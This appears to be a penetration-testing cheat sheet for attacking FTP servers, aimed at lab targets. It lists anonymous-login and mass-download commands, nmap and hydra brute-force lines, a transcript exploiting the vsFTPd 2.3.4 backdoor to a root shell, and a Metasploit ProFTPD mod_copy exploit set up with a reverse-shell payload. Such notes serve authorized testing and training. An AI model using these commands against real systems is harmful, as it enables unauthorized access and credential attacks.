### Connect string:
ftp ip
nc ip 21

telnet -vn <IP> 21

ftp <IP>
anonymous
anonymous
ls -a #List all files (even hidden) (yes, they could be hidden)
binary #Set transmission to binary instead of ascii, important
ascii #Set transmission to ascii instead of binary
bye #exit


### Log In via Browser
ftp://anonymous:anonymous@10.10.10.98

### Commands:
HELP
214-The following commands are recognized (* =>'s unimplemented):

214-CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
214-EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
214-XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
214-NOOP    FEAT    OPTS    AUTH    CCC*    CONF*   ENC*    MIC*    
214-PBSZ    PROT    TYPE    STRU    MODE    RETR    STOR    STOU    
214-APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
214-NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root
FEAT
211-Features:
 PROT
 CCC
 PBSZ
 AUTH TLS
 MFF modify;UNIX.group;UNIX.mode;
 REST STREAM
 MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
 UTF8
 EPRT
 EPSV
 LANG en-US
 MDTM
 SSCN
 TVFS
 MFMT
 SIZE
211 End

### Download files:
wget -m ftp://anonymous:anonymous@10.10.10.98 #Download all

wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all

### metasploit example
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)

Modules
auxiliary/scanner/ftp/ftp_login

### nmap
Brute force
nmap --script ftp-brute -p 21 host

Anonymus Login
nmap --script ftp-anon -p 21 host

Check for backdoor
nmap --script ftp-vsftpd-backdoor -p 21 host

### vsFTPd 2.3.4
If a username is sent that ends in the sequence :) [ a happy face ], the backdoored version will open a listening shell on port 6200.

root@ubuntu:~# telnet 192.168.99.131 21
Trying 192.168.99.131...
Connected to 192.168.99.131.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
user backdoored:)
331 Please specify the password.
pass invalid
^]
telnet> quit
Connection closed.
                       
root@ubuntu:~# telnet 192.168.99.131 6200
Trying 192.168.99.131...
Connected to 192.168.99.131.
Escape character is '^]'.
id;
uid=0(root) gid=0(root)

### ProFTP 1.3.5
msf5 > use exploit/unix/ftp/proftpd_modcopy_exec

msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   
   RHOSTS     10.0.2.15        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   
   RPORT      80               yes       HTTP port (TCP)
   
   RPORT_FTP  21               yes       FTP port
   
   SITEPATH   /var/www/html/   yes       Absolute writable website path
   
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   
   TARGETURI  /                yes       Base path to the website
   
   TMPPATH    /tmp             yes       Absolute writable path
   
   VHOST                       no        HTTP server virtual host
   
Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   
   ----   ---------------  --------  -----------
   
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   
   LPORT  4444             yes       The listen port
   
Exploit target:

   Id  Name
   
   --  ----
   
   0   ProFTPD 1.3.5
   
   ### Brute force with hydra
	
hydra -L user.txt -P pass.txt 192.168.1.103 ftp

Connect with
ftp {IP}
